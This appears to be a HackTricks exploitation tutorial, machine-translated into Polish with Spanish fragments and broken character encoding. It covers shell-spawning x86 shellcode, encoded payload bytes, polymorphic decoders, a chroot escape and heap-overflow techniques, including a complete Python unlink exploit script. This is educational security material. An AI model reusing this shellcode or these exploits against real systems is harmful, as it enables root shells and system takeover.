# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; czyÅ›cimy eax\
xor ebx, ebx ; ebx = 0, poniewaÅ¼ nie ma argumentu do przekazania\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Wykonaj syscall

**nasm -f elf assembly.asm** â€”> Zwraca nam .o\
**ld assembly.o -o shellcodeout** â€”> Daje nam wykonywalny plik utworzony z kodu assemblera i moÅ¼emy uzyskaÄ‡ opcodes za pomocÄ… **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Aby zobaczyÄ‡, Å¼e to rzeczywiÅ›cie nasza shellcode i uzyskaÄ‡ OpCodes

**SprawdÅº, czy shellcode dziaÅ‚a**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby zobaczyÄ‡, Å¼e wywoÅ‚ania systemowe sÄ… realizowane poprawnie, naleÅ¼y skompilowaÄ‡ powyÅ¼szy program, a wywoÅ‚ania systemowe powinny pojawiÄ‡ siÄ™ w **strace ./PROGRAMA\_COMPILADO**

Podczas tworzenia shellcode'Ã³w moÅ¼na zastosowaÄ‡ trik. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie (call) odwoÅ‚uje siÄ™ do oryginalnego kodu i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieÅ›ciliÅ›my potrzebny ciÄ…g, dziÄ™ki czemu z tym EIP moÅ¼emy wskazaÄ‡ na ciÄ…g i kontynuowaÄ‡ wykonywanie kodu.

EJ **TRIK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EJ uÅ¼ywajÄ…c Stosu(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Huter:**

SkÅ‚ada siÄ™ z maÅ‚ego kodu, ktÃ³ry przeszukuje strony pamiÄ™ci zwiÄ…zane z procesem w poszukiwaniu shellcode tam przechowywanego (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy mamy tylko maÅ‚Ä… przestrzeÅ„ na wstrzykniÄ™cie kodu.

**Shellcodes polimÃ³rficzne**

SkÅ‚adajÄ… siÄ™ z zaszyfrowanych shelli, ktÃ³re majÄ… maÅ‚y kod, ktÃ³ry je deszyfruje i przeskakuje do niego, uÅ¼ywajÄ…c sztuczki Call-Pop, to byÅ‚by **przykÅ‚ad szyfrowania cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5.MÃ©todos complementarios**

**Technika Murat**

W systemie Linux wszystkie programy sÄ… mapowane zaczynajÄ…c od 0xbfffffff

PatrzÄ…c na to, jak budowana jest stos nowego procesu w systemie Linux, moÅ¼na opracowaÄ‡ exploit w taki sposÃ³b, aby program byÅ‚ uruchamiany w Å›rodowisku, ktÃ³rego jedynÄ… zmiennÄ… byÅ‚by shellcode. Adres ten moÅ¼na obliczyÄ‡ jako: addr = 0xbfffffff - 4 - strlen(NAZWA\_peÅ‚nego\_programu) - strlen(shellcode)

W ten sposÃ³b moÅ¼na Å‚atwo uzyskaÄ‡ adres, w ktÃ³rym znajduje siÄ™ zmienna Å›rodowiskowa z shellcode.

MoÅ¼na to zrobiÄ‡ dziÄ™ki funkcji execle, ktÃ³ra pozwala na stworzenie Å›rodowiska, ktÃ³re ma tylko te zmienne Å›rodowiskowe, ktÃ³re sÄ… poÅ¼Ä…dane.

###

###

###

###

###

### **Format Strings to Buffer Overflows**

**sprintf** przenosi sformatowany ciÄ…g **do** **zmiennej.** Dlatego moÅ¼na naduÅ¼yÄ‡ **formatowania** ciÄ…gu, aby spowodowaÄ‡ **przepeÅ‚nienie bufora w zmiennej**, do ktÃ³rej kopiowana jest zawartoÅ›Ä‡.\
Na przykÅ‚ad, Å‚adunek `%.44xAAAA` **zapisze 44B+"AAAA" w zmiennej**, co moÅ¼e spowodowaÄ‡ przepeÅ‚nienie bufora.

### **\_\_atexit Structures**

{% hint style="danger" %}
Obecnie bardzo **dziwne jest wykorzystanie tego**.
{% endhint %}

**`atexit()`** to funkcja, do ktÃ³rej **przekazywane sÄ… inne funkcje jako parametry.** Te **funkcje** bÄ™dÄ… **wykonywane** podczas wykonywania **`exit()`** lub **powrotu** z **main**.\
JeÅ›li moÅ¼esz **zmodyfikowaÄ‡** **adres** dowolnej z tych **funkcji**, aby wskazywaÅ‚ na shellcode, na przykÅ‚ad, zyskasz **kontrolÄ™** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania sÄ… **ukryte** za kilkoma strukturami, a ostatecznie adresy, na ktÃ³re wskazujÄ…, nie sÄ… adresami funkcji, ale sÄ… **szyfrowane za pomocÄ… XOR** i przesuniÄ™Ä‡ z **losowym kluczem**. Dlatego obecnie ten wektor ataku jest **niewiele uÅ¼yteczny przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrujÄ…ca** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementujÄ… funkcji szyfrujÄ…cej**, poniewaÅ¼ **zwraca to samo**, co otrzymaÅ‚a jako wejÅ›cie. Tak wiÄ™c te architektury byÅ‚yby atakowalne przez ten wektor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie bardzo **dziwne jest wykorzystanie tego**.
{% endhint %}

**`Setjmp()`** pozwala na **zapisanie** **kontekstu** (rejestrÃ³w)\
**`longjmp()`** pozwala na **przywrÃ³cenie** **kontekstu**.\
**Zapisane rejestry** to: `EBX, ESI, EDI, ESP, EIP, EBP`\
Co siÄ™ dzieje, to to, Å¼e EIP i ESP sÄ… przekazywane przez funkcjÄ™ **`PTR_MANGLE`**, wiÄ™c **architektury podatne na ten atak sÄ… takie same jak powyÅ¼ej**.\
SÄ… one przydatne do odzyskiwania bÅ‚Ä™dÃ³w lub przerwaÅ„.\
Jednak, z tego co przeczytaÅ‚em, inne rejestry nie sÄ… chronione, **wiÄ™c jeÅ›li w funkcji wywoÅ‚ywanej znajduje siÄ™ `call ebx`, `call esi` lub `call edi`**, kontrola moÅ¼e byÄ‡ przejÄ™ta. MoÅ¼na rÃ³wnieÅ¼ zmodyfikowaÄ‡ EBP, aby zmodyfikowaÄ‡ ESP.

**VTable i VPTR w C++**

KaÅ¼da klasa ma **Vtable**, ktÃ³ra jest tablicÄ… **wskaÅºnikÃ³w do metod**.

KaÅ¼dy obiekt klasy ma **VPtr**, ktÃ³ry jest **wskaÅºnikiem** do tablicy swojej klasy. VPtr jest czÄ™Å›ciÄ… nagÅ‚Ã³wka kaÅ¼dego obiektu, wiÄ™c jeÅ›li uda siÄ™ **nadpisaÄ‡** **VPtr**, moÅ¼na go **zmodyfikowaÄ‡**, aby **wskazywaÅ‚** na metodÄ™ zastÄ™pczÄ…, tak aby wykonanie funkcji prowadziÅ‚o do shellcode.

## **Medidas preventivas y evasiones**

###

**ZastÄ…pienie Libsafe**

Aktywuje siÄ™ za pomocÄ…: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Przechwytywane sÄ… wywoÅ‚ania do niektÃ³rych niebezpiecznych funkcji przez inne bezpieczne. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla kompilacji statycznych, nie wszystkie funkcje podatne stajÄ… siÄ™ bezpieczne, a LD\_PRELOAD nie dziaÅ‚a w binariach z suid).

**ASCII Armored Address Space**

Polega na zaÅ‚adowaniu bibliotek wspÃ³Å‚dzielonych od 0x00000000 do 0x00ffffff, aby zawsze byÅ‚ bajt 0x00. Jednak to naprawdÄ™ nie zatrzymuje prawie Å¼adnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na przeprowadzeniu ROP w taki sposÃ³b, aby wywoÅ‚aÄ‡ funkcjÄ™ strcpy@plt (z plt) i wskazaÄ‡ na wpis w GOT oraz skopiowaÄ‡ pierwszy bajt funkcji, ktÃ³rÄ… chce siÄ™ wywoÅ‚aÄ‡ (system()). NastÄ™pnie robi siÄ™ to samo, wskazujÄ…c na GOT+1 i kopiujÄ…c 2. bajt system()â€¦ Na koÅ„cu wywoÅ‚uje siÄ™ adres zapisany w GOT, ktÃ³ry bÄ™dzie system().

**Klatki z chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instaluje podstawowy system w okreÅ›lonym podkatalogu

Administrator moÅ¼e wyjÅ›Ä‡ z jednej z tych klatek, wykonujÄ…c: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind â€”> Szuka bÅ‚Ä™dÃ³w\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits bÃ¡sicos**

**Przydzielony kawaÅ‚ek**

prev\_size |\
size | â€”NagÅ‚Ã³wek\
\*mem | Dane

**Wolny kawaÅ‚ek**

prev\_size |\
size |\
\*fd | WskaÅºnik do nastÄ™pnego kawaÅ‚ka\
\*bk | WskaÅºnik do poprzedniego kawaÅ‚ka â€”NagÅ‚Ã³wek\
\*mem | Dane

Wolne kawaÅ‚ki znajdujÄ… siÄ™ na podwÃ³jnie powiÄ…zanej liÅ›cie (bin) i nigdy nie mogÄ… byÄ‡ dwa wolne kawaÅ‚ki obok siebie (sÄ… Å‚Ä…czone).

W "size" sÄ… bity, aby wskazaÄ‡: Czy poprzedni kawaÅ‚ek jest w uÅ¼yciu, czy kawaÅ‚ek zostaÅ‚ przydzielony za pomocÄ… mmap() i czy kawaÅ‚ek naleÅ¼y do gÅ‚Ã³wnej areny.

JeÅ›li podczas zwalniania kawaÅ‚ka ktÃ³rykolwiek z sÄ…siednich jest wolny, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i nowy wiÄ™kszy kawaÅ‚ek jest przekazywany do frontlink(), aby wstawiÅ‚ odpowiedni bin.

unlink(){\
BK = P->bk; â€”> BK nowego kawaÅ‚ka to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny\
FD = P->fd; â€”> FD nowego kawaÅ‚ka to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny\
FD->bk = BK; â€”> BK nastÄ™pnego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
BK->fd = FD; â€”> FD poprzedniego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
}

Dlatego, jeÅ›li uda nam siÄ™ zmodyfikowaÄ‡ P->bk z adresem shellcode i P->fd z adresem do wpisu w GOT lub DTORS minus 12, osiÄ…gamy:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I w ten sposÃ³b shellcode zostanie wykonany po zakoÅ„czeniu programu.

Dodatkowo, 4. instrukcja unlink() zapisuje coÅ›, a shellcode musi byÄ‡ naprawiona dla tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> To powoduje zapisanie 4 bajtÃ³w od 8. bajtu shellcode, wiÄ™c pierwsza instrukcja shellcode musi byÄ‡ jmp, aby to przeskoczyÄ‡ i przejÅ›Ä‡ do nops, ktÃ³re prowadzÄ… do reszty shellcode.

W zwiÄ…zku z tym exploit jest tworzony:

W buffer1 umieszczamy shellcode, zaczynajÄ…c od jmp, aby trafiÄ‡ w nops lub w resztÄ™ shellcode.

Po shellcode dodajemy wypeÅ‚nienie, aÅ¼ dotrzemy do pola prev\_size i size nastÄ™pnego kawaÅ‚ka. W tych miejscach umieszczamy 0xfffffff0 (w taki sposÃ³b, aby nadpisaÄ‡ prev\_size, aby miaÅ‚ bit wskazujÄ…cy, Å¼e jest wolny) i â€œ-4â€œ(0xfffffffc) w size (aby, gdy sprawdzi w 3. kawaÅ‚ku, czy 2. byÅ‚ w rzeczywistoÅ›ci wolny, poszÅ‚o do zmodyfikowanego prev\_size, ktÃ³re powie, Å¼e jest wolny) -> Tak wiÄ™c, gdy free() zbada, pÃ³jdzie do size 3. kawaÅ‚ka, ale w rzeczywistoÅ›ci pÃ³jdzie do 2. - 4 i pomyÅ›li, Å¼e 2. kawaÅ‚ek jest wolny. A nastÄ™pnie wywoÅ‚a **unlink()**.

Podczas wywoÅ‚ywania unlink() uÅ¼yje jako P->fd pierwszych danych 2. kawaÅ‚ka, wiÄ™c tam wprowadzi adres, ktÃ³ry chce nadpisaÄ‡ - 12 (poniewaÅ¼ w FD->bk doda 12 do zapisanej w FD adresu). A w tym adresie wprowadzi drugi adres, ktÃ³ry znajdzie w 2. kawaÅ‚ku, ktÃ³ry nas interesuje, aby byÅ‚ adresem do shellcode (faÅ‚szywe P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtÃ³w wypeÅ‚nienia**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesuje, aby bit wskazujÄ…cy, Å¼e poprzedni kawaÅ‚ek jest wolny, byÅ‚ ustawiony na 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, aby myÅ›laÅ‚, Å¼e â€œsizeâ€ 3. kawaÅ‚ka jest 4 bajty wstecz (wskazuje na prev\_size), poniewaÅ¼ tam sprawdza, czy 2. kawaÅ‚ek jest wolny**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poczÄ…tku Å‚adunku umieÅ›cimy 8 bajtÃ³w wypeÅ‚nienia**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (bÄ™dzie to adres, ktÃ³ry zostanie nadpisany, aby uruchomiÄ‡ shellcode przy 2. wywoÅ‚aniu free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Jak juÅ¼ powiedziano, Å‚adunek zaczyna siÄ™ od 8 bajtÃ³w wypeÅ‚nienia, bo tak**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy 2. kawaÅ‚ek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniajÄ…c w odwrotnej kolejnoÅ›ci (wargame)**

Kontrolujemy 3 kolejne kawaÅ‚ki i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci do zarezerwowanych.

W tym przypadku:

W kawaÅ‚ku c umieszczamy shellcode

KawaÅ‚ek a uÅ¼ywamy do nadpisania b w taki sposÃ³b, aby size miaÅ‚o bit PREV\_INUSE wyÅ‚Ä…czony, aby myÅ›laÅ‚, Å¼e kawaÅ‚ek a jest wolny.

Dodatkowo, nadpisujemy w nagÅ‚Ã³wku b size, aby wynosiÅ‚o -4.

W ten sposÃ³b program pomyÅ›li, Å¼e â€œaâ€ jest wolne i w binie, wiÄ™c wywoÅ‚a unlink() w celu odÅ‚Ä…czenia go. Jednak, poniewaÅ¼ nagÅ‚Ã³wek PREV\_SIZE wynosi -4, pomyÅ›li, Å¼e kawaÅ‚ek â€œaâ€ w rzeczywistoÅ›ci zaczyna siÄ™ w b+4. To znaczy, wywoÅ‚a unlink() na kawaÅ‚ku, ktÃ³ry zaczyna siÄ™ w b+4, wiÄ™c w b+12 bÄ™dzie wskaÅºnik â€œfdâ€, a w b+16 bÄ™dzie wskaÅºnik â€œbkâ€.

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres do shellcode, a w fd umieÅ›cimy adres do funkcji â€œputs()â€-12, mamy nasz Å‚adunek.

**Technika Frontlink**

Nazywa siÄ™ frontlink, gdy zwalnia siÄ™ coÅ› i Å¼aden z jego sÄ…siednich kawaÅ‚kÃ³w nie jest wolny, nie wywoÅ‚uje siÄ™ unlink(), lecz bezpoÅ›rednio wywoÅ‚uje frontlink().

Przydatna podatnoÅ›Ä‡, gdy malloc, ktÃ³ry jest atakowany, nigdy nie jest zwalniany (free()).

Wymaga:

Bufora, ktÃ³ry moÅ¼e byÄ‡ przepeÅ‚niony za pomocÄ… funkcji wejÅ›ciowej

Bufora przylegajÄ…cego do tego, ktÃ³ry musi byÄ‡ zwolniony i ktÃ³rego pole fd nagÅ‚Ã³wka zostanie zmodyfikowane dziÄ™ki przepeÅ‚nieniu poprzedniego bufora

Bufora do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufora zadeklarowanego przed krokiem 3, ktÃ³ry pozwoli na nadpisanie prev\_size tego

W ten sposÃ³b, osiÄ…gajÄ…c nadpisanie w dwÃ³ch mallocach w sposÃ³b niekontrolowany i w jednym w sposÃ³b kontrolowany, ale tylko ten jeden jest zwalniany, moÅ¼emy stworzyÄ‡ exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li wywoÅ‚a siÄ™ dwa razy free() z tym samym wskaÅºnikiem, pozostajÄ… dwa biny wskazujÄ…ce na ten sam adres.

W przypadku chÄ™ci ponownego uÅ¼ycia jednego, zostanie przypisany bez problemÃ³w. W przypadku chÄ™ci uÅ¼ycia drugiego, zostanie przypisany ten sam obszar, przez co bÄ™dziemy mieli wskaÅºniki â€œfdâ€ i â€œbkâ€ faÅ‚szywe z danymi, ktÃ³re zapisze poprzednia rezerwacja.

**After free()**

WczeÅ›niej zwolniony wskaÅºnik jest uÅ¼ywany ponownie bez kontroli.

## **8 Heap Overflows: Exploits avanzados**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te po modyfikacji funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie dowolnego kodu. WaÅ¼ne jest, aby znaleÅºÄ‡ drugi kawaÅ‚ek, ktÃ³ry moÅ¼e byÄ‡ przepeÅ‚niony przez wczeÅ›niejszy i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public\_fREe(mem), co robi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mem); â€”> Zwraca wskaÅºnik do adresu, w ktÃ³rym zaczyna siÄ™ kawaÅ‚ek (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

W \[1] sprawdza pole size bit NON\_MAIN\_ARENA, ktÃ³re moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wykonaÅ‚o heap\_for\_ptr(), ktÃ³re wykonuje and na â€œmemâ€, pozostawiajÄ…c 2.5 najmniej znaczÄ…ce bajty na 0 (w naszym przypadku z 0x0804a000 pozostawia 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar\_ptr (jakby to byÅ‚ struct heap\_info)

W ten sposÃ³b, jeÅ›li moÅ¼emy kontrolowaÄ‡ kawaÅ‚ek na przykÅ‚ad w 0x0804a000 i ma byÄ‡ zwolniony kawaÅ‚ek w **0x081002a0**, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡, co chcemy, na przykÅ‚ad **0x0804a000**. Gdy ten drugi kawaÅ‚ek zostanie zwolniony, okaÅ¼e siÄ™, Å¼e heap\_for\_ptr(ptr)->ar\_ptr zwraca to, co zapisaliÅ›my w 0x08100000 (poniewaÅ¼ stosuje siÄ™ do 0x081002a0 and, ktÃ³re widzieliÅ›my wczeÅ›niej, a z tego uzyskuje siÄ™ wartoÅ›Ä‡ 4 pierwszych bajtÃ³w, ar\_ptr)

W ten sposÃ³b wywoÅ‚uje siÄ™ \_int\_free(ar\_ptr, mem), to znaczy, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ to, co zapisaliÅ›my w kawaÅ‚ku, ktÃ³ry ma byÄ‡ zwolniony.

Tak jak definiuje unsorted\_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego, jeÅ›li w av->bins\[2] zapiszemy wartoÅ›Ä‡ \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zapisze siÄ™ w \_\_DTOR\_END\_\_ adres drugiego kawaÅ‚ka.

To znaczy, w pierwszym kawaÅ‚ku musimy na poczÄ…tku wielokrotnie umieÅ›ciÄ‡ adres \_\_DTOR\_END\_\_-12, poniewaÅ¼ stamtÄ…d weÅºmie av->bins\[2]

W adresie, w ktÃ³rym wylÄ…duje adres drugiego kawaÅ‚ka z ostatnimi 5 zerami, naleÅ¼y zapisaÄ‡ adres do tego pierwszego kawaÅ‚ka, aby heap\_for\_ptr() myÅ›laÅ‚, Å¼e ar\_ptr jest na poczÄ…tku pierwszego kawaÅ‚ka i wyciÄ…gnie stamtÄ…d av->bins\[2]

W drugim kawaÅ‚ku i dziÄ™ki pierwszemu nadpisujemy prev\_size z jump 0x0c i size czymÅ›, aby aktywowaÄ‡ -> NON\_MAIN\_ARENA

NastÄ™pnie w kawaÅ‚ku 2 umieszczamy mnÃ³stwo nops i na koÅ„cu shellcode.

W ten sposÃ³b wywoÅ‚a siÄ™ \_int\_free(TROZO1, TROZO2) i wykona instrukcje, aby zapisaÄ‡ w \_\_DTOR\_END\_\_ adres prev\_size kawaÅ‚ka 2, ktÃ³ry przeskoczy do shellcode.

Aby zastosowaÄ‡ tÄ™ technikÄ™, naleÅ¼y speÅ‚niÄ‡ kilka dodatkowych wymagaÅ„, ktÃ³re nieco komplikujÄ… Å‚adunek.

Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zastosowano prawie tÄ™ samÄ… Å‚atkÄ™, co dla unlink. PorÃ³wnuje siÄ™, czy nowe miejsce, na ktÃ³re wskazuje, rÃ³wnieÅ¼ wskazuje na niego.

**Fastbin**

Jest to wariant The house of mind

Interesuje nas, aby wykonaÄ‡ nastÄ™pujÄ…cy kod, do ktÃ³rego dochodzi po pierwszym sprawdzeniu funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gdzie fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li umieÅ›cimy w â€œfbâ€ adres funkcji w GOT, w tym adresie umieÅ›cimy adres do nadpisanego kawaÅ‚ka. Aby to zrobiÄ‡, konieczne bÄ™dzie, aby arena byÅ‚a blisko adresÃ³w dtors. DokÅ‚adniej, aby av->max\_fast znajdowaÅ‚o siÄ™ w adresie, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ w The House of Mind widzieliÅ›my, Å¼e kontrolowaliÅ›my pozycjÄ™ av.

WiÄ™c jeÅ›li w polu size umieÅ›cimy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1], co wskaÅ¼e na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie tym, na ktÃ³ry wskazuje, lecz ta pozycja bÄ™dzie nadpisana).

Dodatkowo musi byÄ‡ speÅ‚nione, Å¼e kawaÅ‚ek przylegajÄ…cy do zwolnionego musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego kawaÅ‚ka wynosi 8, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ tylko rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ dodatkowo shellcode bÄ™dzie w zwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ jmp, ktÃ³ry trafi w nops).

Dodatkowo, ten sam faÅ‚szywy kawaÅ‚ek musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Z powodu zer w \_DTOR\_END\_ i niewielkiej liczby adresÃ³w w GOT, Å¼aden z adresÃ³w w tych sekcjach nie nadaje siÄ™ do nadpisania, wiÄ™c zobaczmy, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** do stosu.

JeÅ›li zmodyfikujemy rozmiar, aby wynosiÅ‚ 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0] i moÅ¼emy to wykorzystaÄ‡ do nadpisania stosu.

Aby to zrobiÄ‡, nie moÅ¼e byÄ‡ Å¼adnego canary ani dziwnych wartoÅ›ci na stosie, w rzeczywistoÅ›ci musimy znajdowaÄ‡ siÄ™ w tym: 4 bajty zerowe + EBP + RET

4 bajty zerowe sÄ… potrzebne, aby **av** znajdowaÅ‚o siÄ™ pod tym adresem, a pierwszy element **av** to mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra posÅ‚uÅ¼y nam do ominiÄ™cia ograniczeÅ„.

W **av->fastbins\[0]** zostanie nadpisany adresem **p** i bÄ™dzie RET, w ten sposÃ³b przeskoczy do shellcode.

Dodatkowo, w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie sporo Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ przeprowadzane sprawdzenie.

